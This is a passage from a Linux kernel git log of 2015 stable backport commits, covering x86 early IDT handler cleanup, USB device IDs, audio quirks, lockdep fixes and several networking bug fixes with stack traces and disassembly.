    The early_idt_handlers asm code generates an array of entry
    points spaced nine bytes apart.  It's not really clear from that
    code or from the places that reference it what's going on, and
    the code only works in the first place because GAS never
    generates two-byte JMP instructions when jumping to global
    labels.
    
    Clean up the code to generate the correct array stride (member size)
    explicitly. This should be considerably more robust against
    screw-ups, as GAS will warn if a .fill directive has a negative
    count.  Using '. =' to advance would have been even more robust
    (it would generate an actual error if it tried to move
    backwards), but it would pad with nulls, confusing anyone who
    tries to disassemble the code.  The new scheme should be much
    clearer to future readers.
    
    While we're at it, improve the comments and rename the array and
    common code.
    
    Binutils may start relaxing jumps to non-weak labels.  If so,
    this change will fix our build, and we may need to backport this
    change.
    
    Before, on x86_64:
    
      0000000000000000 <early_idt_handlers>:
         0:   6a 00                   pushq  $0x0
         2:   6a 00                   pushq  $0x0
         4:   e9 00 00 00 00          jmpq   9 <early_idt_handlers+0x9>
                              5: R_X86_64_PC32        early_idt_handler-0x4
      ...
        48:   66 90                   xchg   %ax,%ax
        4a:   6a 08                   pushq  $0x8
        4c:   e9 00 00 00 00          jmpq   51 <early_idt_handlers+0x51>
                              4d: R_X86_64_PC32       early_idt_handler-0x4
      ...
       117:   6a 00                   pushq  $0x0
       119:   6a 1f                   pushq  $0x1f
       11b:   e9 00 00 00 00          jmpq   120 <early_idt_handler>
                              11c: R_X86_64_PC32      early_idt_handler-0x4
    
    After:
    
      0000000000000000 <early_idt_handler_array>:
         0:   6a 00                   pushq  $0x0
         2:   6a 00                   pushq  $0x0
         4:   e9 14 01 00 00          jmpq   11d <early_idt_handler_common>
      ...
        48:   6a 08                   pushq  $0x8
        4a:   e9 d1 00 00 00          jmpq   120 <early_idt_handler_common>
        4f:   cc                      int3
        50:   cc                      int3
      ...
       117:   6a 00                   pushq  $0x0
       119:   6a 1f                   pushq  $0x1f
       11b:   eb 03                   jmp    120 <early_idt_handler_common>
       11d:   cc                      int3
       11e:   cc                      int3
       11f:   cc                      int3
    
    Signed-off-by: Andy Lutomirski <luto@kernel.org>
    Acked-by: H. Peter Anvin <hpa@linux.intel.com>
    Cc: Binutils <binutils@sourceware.org>
    Cc: Borislav Petkov <bp@alien8.de>
    Cc: H.J. Lu <hjl.tools@gmail.com>
    Cc: Jan Beulich <JBeulich@suse.com>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Peter Zijlstra <peterz@infradead.org>
    Cc: Thomas Gleixner <tglx@linutronix.de>
    Link: http://lkml.kernel.org/r/ac027962af343b0c599cbfcf50b945ad2ef3d7a8.1432336324.git.luto@kernel.org
    Signed-off-by: Ingo Molnar <mingo@kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 4f1ba7fe8f6bb35470101c178d0228bf51210610
Author: Patrick Riphagen <patrick.riphagen@xsens.com>
Date:   Tue May 19 10:03:01 2015 +0200

    USB: serial: ftdi_sio: Add support for a Motion Tracker Development Board
    
    commit 1df5b888f54070a373a73b34488cc78c2365b7b4 upstream.
    
    This adds support for new Xsens device, Motion Tracker Development Board,
    using Xsens' own Vendor ID
    
    Signed-off-by: Patrick Riphagen <patrick.riphagen@xsens.com>
    Signed-off-by: Johan Hovold <johan@kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 6b100ba4c284c527ddd1ab31ac856ccba8649841
Author: John D. Blair <johnb@candicontrols.com>
Date:   Thu Jun 4 13:18:19 2015 -0700

    USB: cp210x: add ID for HubZ dual ZigBee and Z-Wave dongle
    
    commit df72d588c54dad57dabb3cc8a87475d8ed66d806 upstream.
    
    Added the USB serial device ID for the HubZ dual ZigBee
    and Z-Wave radio dongle.
    
    Signed-off-by: John D. Blair <johnb@candicontrols.com>
    Signed-off-by: Johan Hovold <johan@kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 42928ef4b6714a93cb445fc4930368a55793cf64
Author: Dan Williams <dan.j.williams@intel.com>
Date:   Wed Jun 10 23:47:14 2015 -0400

    block: fix ext_dev_lock lockdep report
    
    commit 4d66e5e9b6d720d8463e11d027bd4ad91c8b1318 upstream.
    
     =================================
     [ INFO: inconsistent lock state ]
     4.1.0-rc7+ #217 Tainted: G           O
     ---------------------------------
     inconsistent {SOFTIRQ-ON-W} -> {IN-SOFTIRQ-W} usage.
     swapper/6/0 [HC0[0]:SC1[1]:HE1:SE0] takes:
      (ext_devt_lock){+.?...}, at: [<ffffffff8143a60c>] blk_free_devt+0x3c/0x70
     {SOFTIRQ-ON-W} state was registered at:
       [<ffffffff810bf6b1>] __lock_acquire+0x461/0x1e70
       [<ffffffff810c1947>] lock_acquire+0xb7/0x290
       [<ffffffff818ac3a8>] _raw_spin_lock+0x38/0x50
       [<ffffffff8143a07d>] blk_alloc_devt+0x6d/0xd0  <-- take the lock in process context
    [..]
      [<ffffffff810bf64e>] __lock_acquire+0x3fe/0x1e70
      [<ffffffff810c00ad>] ? __lock_acquire+0xe5d/0x1e70
      [<ffffffff810c1947>] lock_acquire+0xb7/0x290
      [<ffffffff8143a60c>] ? blk_free_devt+0x3c/0x70
      [<ffffffff818ac3a8>] _raw_spin_lock+0x38/0x50
      [<ffffffff8143a60c>] ? blk_free_devt+0x3c/0x70
      [<ffffffff8143a60c>] blk_free_devt+0x3c/0x70    <-- take the lock in softirq
      [<ffffffff8143bfec>] part_release+0x1c/0x50
      [<ffffffff8158edf6>] device_release+0x36/0xb0
      [<ffffffff8145ac2b>] kobject_cleanup+0x7b/0x1a0
      [<ffffffff8145aad0>] kobject_put+0x30/0x70
      [<ffffffff8158f147>] put_device+0x17/0x20
      [<ffffffff8143c29c>] delete_partition_rcu_cb+0x16c/0x180
      [<ffffffff8143c130>] ? read_dev_sector+0xa0/0xa0
      [<ffffffff810e0e0f>] rcu_process_callbacks+0x2ff/0xa90
      [<ffffffff810e0dcf>] ? rcu_process_callbacks+0x2bf/0xa90
      [<ffffffff81067e2e>] __do_softirq+0xde/0x600
    
    Neil sees this in his tests and it also triggers on pmem driver unbind
    for the libnvdimm tests.  This fix is on top of an initial fix by Keith
    for incorrect usage of mutex_lock() in this path: 2da78092dda1 "block:
    Fix dev_t minor allocation lifetime".  Both this and 2da78092dda1 are
    candidates for -stable.
    
    Fixes: 2da78092dda1 ("block: Fix dev_t minor allocation lifetime")
    Cc: Keith Busch <keith.busch@intel.com>
    Reported-by: NeilBrown <neilb@suse.de>
    Signed-off-by: Dan Williams <dan.j.williams@intel.com>
    Signed-off-by: Jens Axboe <axboe@fb.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 0a5506c38741dc43a123d895684d17fe63c387cc
Author: Hans de Goede <hdegoede@redhat.com>
Date:   Tue Jun 2 10:40:50 2015 -0700

    Input: elantech - fix detection of touchpads where the revision matches a known rate
    
    commit 5f0ee9d17aae628b22be86966471db65be21f262 upstream.
    
    Make the check to skip the rate check more lax, so that it applies
    to all hw_version 4 models.
    
    This fixes the touchpad not being detected properly on Asus PU551LA
    laptops.
    
    Reported-and-tested-by: David Zafra Gómez <dezeta@klo.es>
    Signed-off-by: Hans de Goede <hdegoede@redhat.com>
    Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit b6c610113d87de68e22485c8a0d6d46f84c6c6ed
Author: Peter Hutterer <peter.hutterer@who-t.net>
Date:   Mon Jun 8 10:17:32 2015 -0700

    Input: synaptics - add min/max quirk for Lenovo S540
    
    commit 7f2ca8b55aeff1fe51ed3570200ef88a96060917 upstream.
    
    https://bugzilla.redhat.com/show_bug.cgi?id=1223051#c2
    
    Tested-by: tommy.gagnes@gmail.com
    Signed-off-by: Peter Hutterer <peter.hutterer@who-t.net>
    Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 2662f84d734c5d2bf918ea4f4be8dcb3a386940b
Author: Clemens Ladisch <clemens@ladisch.de>
Date:   Wed Jun 3 11:36:42 2015 +0200

    ALSA: usb-audio: add MAYA44 USB+ mixer control names
    
    commit 044bddb9ca8d49edb91bc22b9940a463b0dbb97f upstream.
    
    Add mixer control names for the ESI Maya44 USB+ (which appears to be
    identical width the AudioTrak Maya44 USB).
    
    Reported-by: nightmixes <nightmixes@gmail.com>
    Signed-off-by: Clemens Ladisch <clemens@ladisch.de>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 1d996923485040338a7278d6b918e66a64b96561
Author: Wolfram Sang <wsa@the-dreams.de>
Date:   Fri May 29 19:50:56 2015 +0900

    ALSA: usb-audio: Add mic volume fix quirk for Logitech Quickcam Fusion
    
    commit 1ef9f0583514508bc93427106ceef3215e4eb1a5 upstream.
    
    Fix this from the logs:
    
    usb 7-1: New USB device found, idVendor=046d, idProduct=08ca
    ...
    usb 7-1: Warning! Unlikely big volume range (=3072), cval->res is probably wrong.
    usb 7-1: [5] FU [Mic Capture Volume] ch = 1, val = 4608/7680/1
    
    Signed-off-by: Wolfram Sang <wsa@the-dreams.de>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 9fd205c81b0f8396d2579cd6a2eb28629e31aa49
Author: Takashi Iwai <tiwai@suse.de>
Date:   Tue Jun 2 19:57:08 2015 +0200

    ALSA: hda/realtek - Add a fixup for another Acer Aspire 9420
    
    commit b5d724b1add6eabf3aa7276ab3454ea9f45eebd3 upstream.
    
    Acer Aspire 9420 with ALC883 (1025:0107) needs the fixup for EAPD to
    make the sound working like other Aspire models.
    
    Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=94111
    Signed-off-by: Takashi Iwai <tiwai@suse.de>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 3bb76d57f40a3d086b386c26e4340ba3017fd471
Author: Laura Abbott <labbott@fedoraproject.org>
Date:   Thu May 14 11:42:17 2015 -0700

    n_tty: Fix auditing support for cannonical mode
    
    commit 72586c6061ab8c23ffd9f301ed19782a44ff5f04 upstream.
    
    Commit 32f13521ca68bc624ff6effc77f308a52b038bf0
    ("n_tty: Line copy to user buffer in canonical mode")
    changed cannonical mode copying to use copy_to_user
    but missed adding the call to the audit framework.
    Add in the appropriate functions to get audit support.
    
    Fixes: 32f13521ca68 ("n_tty: Line copy to user buffer in canonical mode")
    Reported-by: Miloslav Trmač <mitr@redhat.com>
    Signed-off-by: Laura Abbott <labbott@fedoraproject.org>
    Reviewed-by: Peter Hurley <peter@hurleysoftware.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 209abaeab184e0c75728b380914117b7be2dd89a
Author: Paul Cercueil <paul.cercueil@analog.com>
Date:   Fri May 15 17:18:36 2015 +0200

    iio: adis16400: Compute the scan mask from channel indices
    
    commit c2a8b623a089d52c199e305e7905829907db8ec8 upstream.
    
    We unfortunately can't use ~0UL for the scan mask to indicate that the
    only valid scan mask is all channels selected. The IIO core needs the exact
    mask to work correctly and not a super-set of it. So calculate the masked
    based on the channels that are available for a particular device.
    
    Signed-off-by: Paul Cercueil <paul.cercueil@analog.com>
    Signed-off-by: Lars-Peter Clausen <lars@metafoo.de>
    Fixes: 5eda3550a3cc ("staging:iio:adis16400: Preallocate transfer message")
    Signed-off-by: Jonathan Cameron <jic23@kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 220fa1e4d7069b677d6aa9723ff71674decdbb28
Author: Paul Cercueil <paul.cercueil@analog.com>
Date:   Fri May 15 17:18:35 2015 +0200

    iio: adis16400: Use != channel indices for the two voltage channels
    
    commit 7323d59862802ca109451eeda9777024a7625509 upstream.
    
    Previously, the two voltage channels had the same ID, which didn't cause
    conflicts in sysfs only because one channel is named and the other isn't;
    this is still violating the spec though, two indexed channels should never
    have the same index.
    
    Signed-off-by: Paul Cercueil <paul.cercueil@analog.com>
    Signed-off-by: Lars-Peter Clausen <lars@metafoo.de>
    Signed-off-by: Jonathan Cameron <jic23@kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 8fdf5cac123483476bc51c5149b83a984eb8bdb2
Author: Lars-Peter Clausen <lars@metafoo.de>
Date:   Fri May 15 17:18:34 2015 +0200

    iio: adis16400: Report pressure channel scale
    
    commit 69ca2d771e4e709c5ae1125858e1246e77ef8b86 upstream.
    
    Add the scale for the pressure channel, which is currently missing.
    
    Signed-off-by: Lars-Peter Clausen <lars@metafoo.de>
    Fixes: 76ada52f7f5d ("iio:adis16400: Add support for the adis16448")
    Signed-off-by: Jonathan Cameron <jic23@kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 8c966e7403a9ab45bdc9c6b3c6f8ea21497e3d54
Author: Axel Lin <axel.lin@ingics.com>
Date:   Wed May 20 08:53:20 2015 +0800

    iio: adc: twl6030-gpadc: Fix modalias
    
    commit e5d732186270e0881f47d95610316c0614b21c3e upstream.
    
    Remove extra space between platform prefix and DRIVER_NAME in MODULE_ALIAS.
    
    Signed-off-by: Axel Lin <axel.lin@ingics.com>
    Signed-off-by: Jonathan Cameron <jic23@kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 44da7386bb0bee83d2a11717e43730c27f4da717
Author: Nikolay Aleksandrov <nikolay@cumulusnetworks.com>
Date:   Sat Jun 6 06:49:00 2015 -0700

    bridge: disable softirqs around br_fdb_update to avoid lockup
    
    [ Upstream commit c4c832f89dc468cf11dc0dd17206bace44526651 ]
    
    br_fdb_update() can be called in process context in the following way:
    br_fdb_add() -> __br_fdb_add() -> br_fdb_update() (if NTF_USE flag is set)
    so we need to disable softirqs because there are softirq users of the
    hash_lock. One easy way to reproduce this is to modify the bridge utility
    to set NTF_USE, enable stp and then set maxageing to a low value so
    br_fdb_cleanup() is called frequently and then just add new entries in
    a loop. This happens because br_fdb_cleanup() is called from timer/softirq
    context. The spin locks in br_fdb_update were _bh before commit f8ae737deea1
    ("[BRIDGE]: forwarding remove unneeded preempt and bh diasables")
    and at the time that commit was correct because br_fdb_update() couldn't be
    called from process context, but that changed after commit:
    292d1398983f ("bridge: add NTF_USE support")
    Using local_bh_disable/enable around br_fdb_update() allows us to keep
    using the spin_lock/unlock in br_fdb_update for the fast-path.
    
    Signed-off-by: Nikolay Aleksandrov <nikolay@cumulusnetworks.com>
    Fixes: 292d1398983f ("bridge: add NTF_USE support")
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit fa730505072b85750f21f652783bb595dc22bbd5
Author: Shawn Bohrer <sbohrer@rgmadvisors.com>
Date:   Wed Jun 3 16:27:38 2015 -0500

    ipv4/udp: Verify multicast group is ours in upd_v4_early_demux()
    
    [ Upstream commit 6e540309326188f769e03bb4c6dd8ff6752930c2 ]
    
    421b3885bf6d56391297844f43fb7154a6396e12 "udp: ipv4: Add udp early
    demux" introduced a regression that allowed sockets bound to INADDR_ANY
    to receive packets from multicast groups that the socket had not joined.
    For example a socket that had joined 224.168.2.9 could also receive
    packets from 225.168.2.9 despite not having joined that group if
    ip_early_demux is enabled.
    
    Fix this by calling ip_check_mc_rcu() in udp_v4_early_demux() to verify
    that the multicast packet is indeed ours.
    
    Signed-off-by: Shawn Bohrer <sbohrer@rgmadvisors.com>
    Reported-by: Yurij M. Plotnikov <Yurij.Plotnikov@oktetlabs.ru>
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 67070968a28bd501e2ff864bab3e95006cca4e00
Author: Ian Campbell <Ian.Campbell@citrix.com>
Date:   Mon Jun 1 11:30:24 2015 +0100

    xen: netback: read hotplug script once at start of day.
    
    [ Upstream commit 31a418986a5852034d520a5bab546821ff1ccf3d ]
    
    When we come to tear things down in netback_remove() and generate the
    uevent it is possible that the xenstore directory has already been
    removed (details below).
    
    In such cases netback_uevent() won't be able to read the hotplug
    script and will write a xenstore error node.
    
    A recent change to the hypervisor exposed this race such that we now
    sometimes lose it (where apparently we didn't ever before).
    
    Instead read the hotplug script configuration during setup and use it
    for the lifetime of the backend device.
    
    The apparently more obvious fix of moving the transition to
    state=Closed in netback_remove() to after the uevent does not work
    because it is possible that we are already in state=Closed (in
    reaction to the guest having disconnected as it shutdown). Being
    already in Closed means the toolstack is at liberty to start tearing
    down the xenstore directories. In principal it might be possible to
    arrange to unregister the device sooner (e.g on transition to Closing)
    such that xenstore would still be there but this state machine is
    fragile and prone to anger...
    
    A modern Xen system only relies on the hotplug uevent for driver
    domains, when the backend is in the same domain as the toolstack it
    will run the necessary setup/teardown directly in the correct sequence
    wrt xenstore changes.
    
    Signed-off-by: Ian Campbell <ian.campbell@citrix.com>
    Acked-by: Wei Liu <wei.liu2@citrix.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 542744f265e23eca08f14a8748a3cbf5feb56cdf
Author: Eric Dumazet <edumazet@google.com>
Date:   Sat May 30 09:16:53 2015 -0700

    udp: fix behavior of wrong checksums
    
    [ Upstream commit beb39db59d14990e401e235faf66a6b9b31240b0 ]
    
    We have two problems in UDP stack related to bogus checksums :
    
    1) We return -EAGAIN to application even if receive queue is not empty.
       This breaks applications using edge trigger epoll()
    
    2) Under UDP flood, we can loop forever without yielding to other
       processes, potentially hanging the host, especially on non SMP.
    
    This patch is an attempt to make things better.
    
    We might in the future add extra support for rt applications
    wanting to better control time spent doing a recv() in a hostile
    environment. For example we could validate checksums before queuing
    packets in socket receive queue.
    
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Willem de Bruijn <willemb@google.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 4d97213d4f0a0c5ee5ad7066c1eb97ada4ffae61
Author: WANG Cong <xiyou.wangcong@gmail.com>
Date:   Tue May 26 16:08:48 2015 -0700

    net_sched: invoke ->attach() after setting dev->qdisc
    
    [ Upstream commit 86e363dc3b50bfd50a1f315934583fbda673ab8d ]
    
    For mq qdisc, we add per tx queue qdisc to root qdisc
    for display purpose, however, that happens too early,
    before the new dev->qdisc is finally set, this causes
    q->list points to an old root qdisc which is going to be
    freed right before assigning with a new one.
    
    Fix this by moving ->attach() after setting dev->qdisc.
    
    For the record, this fixes the following crash:
    
     ------------[ cut here ]------------
     WARNING: CPU: 1 PID: 975 at lib/list_debug.c:59 __list_del_entry+0x5a/0x98()
     list_del corruption. prev->next should be ffff8800d1998ae8, but was 6b6b6b6b6b6b6b6b
     CPU: 1 PID: 975 Comm: tc Not tainted 4.1.0-rc4+ #1019
     Hardware name: Bochs Bochs, BIOS Bochs 01/01/2011
      0000000000000009 ffff8800d73fb928 ffffffff81a44e7f 0000000047574756
      ffff8800d73fb978 ffff8800d73fb968 ffffffff810790da ffff8800cfc4cd20
      ffffffff814e725b ffff8800d1998ae8 ffffffff82381250 0000000000000000
     Call Trace:
      [<ffffffff81a44e7f>] dump_stack+0x4c/0x65
      [<ffffffff810790da>] warn_slowpath_common+0x9c/0xb6
      [<ffffffff814e725b>] ? __list_del_entry+0x5a/0x98
      [<ffffffff81079162>] warn_slowpath_fmt+0x46/0x48
      [<ffffffff81820eb0>] ? dev_graft_qdisc+0x5e/0x6a
      [<ffffffff814e725b>] __list_del_entry+0x5a/0x98
      [<ffffffff814e72a7>] list_del+0xe/0x2d
      [<ffffffff81822f05>] qdisc_list_del+0x1e/0x20
      [<ffffffff81820cd1>] qdisc_destroy+0x30/0xd6
      [<ffffffff81822676>] qdisc_graft+0x11d/0x243
      [<ffffffff818233c1>] tc_get_qdisc+0x1a6/0x1d4
      [<ffffffff810b5eaf>] ? mark_lock+0x2e/0x226
      [<ffffffff817ff8f5>] rtnetlink_rcv_msg+0x181/0x194
      [<ffffffff817ff72e>] ? rtnl_lock+0x17/0x19
      [<ffffffff817ff72e>] ? rtnl_lock+0x17/0x19
      [<ffffffff817ff774>] ? __rtnl_unlock+0x17/0x17
      [<ffffffff81855dc6>] netlink_rcv_skb+0x4d/0x93
      [<ffffffff817ff756>] rtnetlink_rcv+0x26/0x2d
      [<ffffffff818544b2>] netlink_unicast+0xcb/0x150
      [<ffffffff81161db9>] ? might_fault+0x59/0xa9
      [<ffffffff81854f78>] netlink_sendmsg+0x4fa/0x51c
      [<ffffffff817d6e09>] sock_sendmsg_nosec+0x12/0x1d
      [<ffffffff817d8967>] sock_sendmsg+0x29/0x2e
      [<ffffffff817d8cf3>] ___sys_sendmsg+0x1b4/0x23a
      [<ffffffff8100a1b8>] ? native_sched_clock+0x35/0x37
      [<ffffffff810a1d83>] ? sched_clock_local+0x12/0x72
      [<ffffffff810a1fd4>] ? sched_clock_cpu+0x9e/0xb7
      [<ffffffff810def2a>] ? current_kernel_time+0xe/0x32
      [<ffffffff810b4bc5>] ? lock_release_holdtime.part.29+0x71/0x7f
      [<ffffffff810ddebf>] ? read_seqcount_begin.constprop.27+0x5f/0x76
      [<ffffffff810b6292>] ? trace_hardirqs_on_caller+0x17d/0x199
      [<ffffffff811b14d5>] ? __fget_light+0x50/0x78
      [<ffffffff817d9808>] __sys_sendmsg+0x42/0x60
      [<ffffffff817d9838>] SyS_sendmsg+0x12/0x1c
      [<ffffffff81a50e97>] system_call_fastpath+0x12/0x6f
     ---[ end trace ef29d3fb28e97ae7 ]---
    
    For long term, we probably need to clean up the qdisc_graft() code
    in case it hides other bugs like this.
    
    Fixes: 95dc19299f74 ("pkt_sched: give visibility to mq slave qdiscs")
    Cc: Jamal Hadi Salim <jhs@mojatatu.com>
    Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com>
    Acked-by: Eric Dumazet <edumazet@google.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 1f5105d64ea50143a95aabb6b2f86b16580e9350
Author: Mark Salyzyn <salyzyn@android.com>
Date:   Tue May 26 08:22:19 2015 -0700

    unix/caif: sk_socket can disappear when state is unlocked
    
    [ Upstream commit b48732e4a48d80ed4a14812f0bab09560846514e ]
    
    got a rare NULL pointer dereference in clear_bit
    
    Signed-off-by: Mark Salyzyn <salyzyn@android.com>
    Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>
    ----
    v2: switch to sock_flag(sk, SOCK_DEAD) and added net/caif/caif_socket.c
    v3: return -ECONNRESET in upstream caller of wait function for SOCK_DEAD
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit a7aef10597f27af62794556a40cf9648f92f856a
Author: Richard Cochran <richardcochran@gmail.com>
Date:   Mon May 25 11:55:44 2015 +0200

    net: dp83640: reinforce locking rules.
    
    [ Upstream commit a935865c828c8cd20501f618c69f659a5b6d6a5f ]
    
    Callers of the ext_write function are supposed to hold a mutex that
    protects the state of the dialed page, but one caller was missing the
    lock from the very start, and over time the code has been changed
    without following the rule.  This patch cleans up the call sites in
    violation of the rule.
    
    Signed-off-by: Richard Cochran <richardcochran@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 9dae772fe7d9ca1c39970802df69a2a2cc047028
Author: Richard Cochran <richardcochran@gmail.com>
Date:   Mon May 25 11:55:43 2015 +0200

    net: dp83640: fix broken calibration routine.
    
    [ Upstream commit 397a253af5031de4a4612210055935309af4472c ]
    
    Currently, the calibration function that corrects the initial offsets
    among multiple devices only works the first time.  If the function is
    called more than once, the calibration fails and bogus offsets will be
    programmed into the devices.
    
    In a well hidden spot, the device documentation tells that trigger indexes
    0 and 1 are special in allowing the TRIG_IF_LATE flag to actually work.
    
    This patch fixes the issue by using one of the special triggers during the
    recalibration method.
    
    Signed-off-by: Richard Cochran <richardcochran@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 57bc6480ec7693ab03c4b81baa679d4383c5844c
Author: Thadeu Lima de Souza Cascardo <cascardo@redhat.com>
Date:   Fri May 22 12:18:59 2015 -0300

    bridge: fix parsing of MLDv2 reports
    
    [ Upstream commit 47cc84ce0c2fe75c99ea5963c4b5704dd78ead54 ]
    
    When more than a multicast address is present in a MLDv2 report, all but
    the first address is ignored, because the code breaks out of the loop if
    there has not been an error adding that address.
    
    This has caused failures when two guests connected through the bridge
    tried to communicate using IPv6. Neighbor discoveries would not be
    transmitted to the other guest when both used a link-local address and a
    static address.
    
    This only happens when there is a MLDv2 querier in the network.
    
    The fix will only break out of the loop when there is a failure adding a
    multicast address.
    
    The mdb before the patch:
    
    dev ovirtmgmt port vnet0 grp ff02::1:ff7d:6603 temp
    dev ovirtmgmt port vnet1 grp ff02::1:ff7d:6604 temp
    dev ovirtmgmt port bond0.86 grp ff02::2 temp
    
    After the patch:
    
    dev ovirtmgmt port vnet0 grp ff02::1:ff7d:6603 temp
    dev ovirtmgmt port vnet1 grp ff02::1:ff7d:6604 temp
    dev ovirtmgmt port bond0.86 grp ff02::fb temp
    dev ovirtmgmt port bond0.86 grp ff02::2 temp
    dev ovirtmgmt port bond0.86 grp ff02::d temp
    dev ovirtmgmt port vnet0 grp ff02::1:ff00:76 temp
    dev ovirtmgmt port bond0.86 grp ff02::16 temp
    dev ovirtmgmt port vnet1 grp ff02::1:ff00:77 temp
    dev ovirtmgmt port bond0.86 grp ff02::1:ff00:def temp
    dev ovirtmgmt port bond0.86 grp ff02::1:ffa1:40bf temp
    
    Fixes: 08b202b67264 ("bridge br_multicast: IPv6 MLD support.")
    Reported-by: Rik Theys <Rik.Theys@esat.kuleuven.be>
    Signed-off-by: Thadeu Lima de Souza Cascardo <cascardo@redhat.com>
    Tested-by: Rik Theys <Rik.Theys@esat.kuleuven.be>
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 88ad5b3e94ab2fba5bfc2ad4604b15b0aa079a13
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Fri May 22 04:58:12 2015 -0500

    ipv4: Avoid crashing in ip_error
    
    [ Upstream commit 381c759d9916c42959515ad34a6d467e24a88e93 ]
    
    ip_error does not check if in_dev is NULL before dereferencing it.
    
    IThe following sequence of calls is possible:
    CPU A                          CPU B
    ip_rcv_finish
        ip_route_input_noref()
            ip_route_input_slow()
                                   inetdev_destroy()
        dst_input()
    
    With the result that a network device can be destroyed while processing
    an input packet.
    
    A crash was triggered with only unicast packets in flight, and
    forwarding enabled on the only network device.   The error condition
    was created by the removal of the network device.
    
    As such it is likely the that error code was -EHOSTUNREACH, and the
    action taken by ip_error (if in_dev had been accessible) would have
    been to not increment any counters and to have tried and likely failed
    to send an icmp error as the network device is going away.
    
    Therefore handle this weird case by just dropping the packet if
    !in_dev.  It will result in dropping the packet sooner, and will not
    result in an actual change of behavior.
    
    Fixes: 251da4130115b ("ipv4: Cache ip_error() routes even when not forwarding.")
    Reported-by: Vittorio Gambaletta <linuxbugs@vittgam.net>
    Tested-by: Vittorio Gambaletta <linuxbugs@vittgam.net>
    Signed-off-by: Vittorio Gambaletta <linuxbugs@vittgam.net>
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>
    Acked-by: Eric Dumazet <edumazet@google.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 38196b3cb4e9b8e0beb7b30ce39880f0b666f431
Author: Florent Fourcot <florent.fourcot@enst-bretagne.fr>
Date:   Sat May 16 00:24:59 2015 +0200

    tcp/ipv6: fix flow label setting in TIME_WAIT state
    
    [ Upstream commit 21858cd02dabcf290564cbf4769b101eba54d7bb ]
    
    commit 1d13a96c74fc ("ipv6: tcp: fix flowlabel value in ACK messages
    send from TIME_WAIT") added the flow label in the last TCP packets.
    Unfortunately, it was not casted properly.
    
    This patch replace the buggy shift with be32_to_cpu/cpu_to_be32.
    
    Fixes: 1d13a96c74fc ("ipv6: tcp: fix flowlabel value in ACK messages")
    Reported-by: Eric Dumazet <eric.dumazet@gmail.com>
    Signed-off-by: Florent Fourcot <florent.fourcot@enst-bretagne.fr>
    Acked-by: Eric Dumazet <edumazet@google.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit d9c3586ff7b0757d34e475e5eda68586832878ea
Author: Florian Fainelli <f.fainelli@gmail.com>
Date:   Fri May 15 16:30:41 2015 -0700

    net: phy: Allow EEE for all RGMII variants
    
    [ Upstream commit 7e14069651591c81046ffaec13c3dac8cb70f5fb ]
    
    RGMII interfaces come in multiple flavors: RGMII with transmit or
    receive internal delay, no delays at all, or delays in both direction.
    
    This change extends the initial check for PHY_INTERFACE_MODE_RGMII to
    cover all of these variants since EEE should be allowed for any of these
    modes, since it is a property of the RGMII, hence Gigabit PHY capability
    more than the RGMII electrical interface and its delays.
    
    Fixes: a59a4d192166 ("phy: add the EEE support and the way to access to the MMD registers")
    Signed-off-by: Florian Fainelli <f.fainelli@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 4ca11e9fe811defdf228d7f579e77b5350c96d02
Author: Alexei Starovoitov <ast@kernel.org>
